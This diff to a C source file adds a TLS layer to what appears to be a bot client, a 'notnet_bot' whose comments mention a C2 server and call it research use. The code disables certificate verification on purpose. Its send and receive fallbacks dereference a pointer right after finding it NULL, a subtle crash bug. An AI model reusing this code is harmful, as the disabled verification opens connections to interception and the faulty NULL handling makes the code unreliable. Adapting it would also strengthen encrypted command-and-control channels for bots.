@@ -1735,6 +1735,161 @@ int protocol_send_response(notnet_bot_t *bot, const char *command, const char *r
     return len;
 }
 
+/* ── TLS ─────────────────────────────────────────────────────── */
+#ifdef TLS_ENABLED
+#include <openssl/ssl.h>
+#include <openssl/err.h>
+
+static SSL_CTX *tls_ctx = NULL;
+static int tls_init_once = 0;
+
+int tls_init(notnet_tls_t *tls, int sock) {
+    if (!tls) return -1;
+
+    tls->sock = sock;
+    tls->enabled = 0;
+    tls->ssl = NULL;
+
+    /* Lazy init OpenSSL library */
+    if (!tls_init_once) {
+        SSL_library_init();
+        SSL_load_error_strings();
+        tls_init_once = 1;
+    }
+
+    /* Create context if needed */
+    if (!tls_ctx) {
+        const SSL_METHOD *meth = TLS_client_method();
+        tls_ctx = SSL_CTX_new(meth);
+        if (!tls_ctx) {
+            log_error("TLS: SSL_CTX_new failed");
+            return -1;
+        }
+        /* Minimal TLS config: allow TLS 1.2+ */
+        unsigned long opts = SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_TLSv1 | SSL_OP_NO_TLSv1_1;
+        SSL_CTX_set_options(tls_ctx, opts);
+        /* Disable cert verification for research use (pinning via C2) */
+        SSL_CTX_set_verify(tls_ctx, SSL_VERIFY_NONE, NULL);
+    }
+
+    tls->ssl = SSL_new(tls_ctx);
+    if (!tls->ssl) {
+        log_error("TLS: SSL_new failed");
+        return -1;
+    }
+
+    SSL_set_fd(tls->ssl, sock);
+    tls->enabled = 1;
+    return 0;
+}
+
+int tls_handshake(notnet_tls_t *tls, const char *server_name) {
+    if (!tls || !tls->ssl) return -1;
+
+    /* Set SNI for the server name */
+    if (server_name) {
+        SSL_set_tlsext_host_name(tls->ssl, server_name);
+    }
+
+    int ret = SSL_connect(tls->ssl);
+    if (ret <= 0) {
+        int err = SSL_get_error(tls->ssl, ret);
+        log_error("TLS: handshake failed (error %d)", err);
+        return -1;
+    }
+
+    log_info("TLS: connected using %s", SSL_get_cipher(tls->ssl));
+    return 0;
+}
+
+int tls_send(notnet_tls_t *tls, const char *buf, int len) {
+    if (!tls || !tls->ssl || !tls->enabled) {
+        /* Fallback: raw send */
+        return send(tls->sock, buf, len, 0);
+    }
+
+    int sent = SSL_write(tls->ssl, buf, len);
+    if (sent <= 0) {
+        log_warn("TLS: write failed (error %d)", SSL_get_error(tls->ssl, sent));
+        return -1;
+    }
+    return sent;
+}
+
+int tls_recv(notnet_tls_t *tls, char *buf, int len) {
+    if (!tls || !tls->ssl || !tls->enabled) {
+        /* Fallback: raw recv */
+        return recv(tls->sock, buf, len, 0);
+    }
+
+    int received = SSL_read(tls->ssl, buf, len);
+    if (received <= 0) {
+        int err = SSL_get_error(tls->ssl, received);
+        if (err != SSL_ERROR_WANT_READ) {
+            log_warn("TLS: read failed (error %d)", err);
+        }
+        return -1;
+    }
+    return received;
+}
+
+void tls_close(notnet_tls_t *tls) {
+    if (!tls) return;
+
+    if (tls->ssl) {
+        SSL_shutdown(tls->ssl);
+        SSL_free(tls->ssl);
+        tls->ssl = NULL;
+    }
+    tls->enabled = 0;
+}
+
+void tls_cleanup(void) {
+    if (tls_ctx) {
+        SSL_CTX_free(tls_ctx);
+        tls_ctx = NULL;
+    }
+    tls_init_once = 0;
+}
+
+#else /* TLS_ENABLED not defined */
+
+int tls_init(notnet_tls_t *tls, int sock) {
+    if (!tls) return -1;
+    tls->sock = sock;
+    tls->enabled = 0;
+    tls->ssl = NULL;
+    return 0;
+}
+
+int tls_handshake(notnet_tls_t *tls, const char *server_name) {
+    (void)tls;
+    (void)server_name;
+    return 0;
+}
+
+int tls_send(notnet_tls_t *tls, const char *buf, int len) {
+    if (!tls || !tls->enabled) return -1;
+    return send(tls->sock, buf, len, 0);
+}
+
+int tls_recv(notnet_tls_t *tls, char *buf, int len) {
+    if (!tls || !tls->enabled) return -1;
+    return recv(tls->sock, buf, len, 0);
+}
+
+void tls_close(notnet_tls_t *tls) {
+    if (!tls) return;
+    tls->enabled = 0;
+    tls->ssl = NULL;
+}
+
+void tls_cleanup(void) {
+    /* No-op when TLS disabled */
+}
+
+#endif /* TLS_ENABLED */
+
 /* ── Config Loading ──────────────────────────────────────────── */
 int load_config(notnet_bot_t *bot, const char *path) {
     FILE *f = fopen(path, "r");
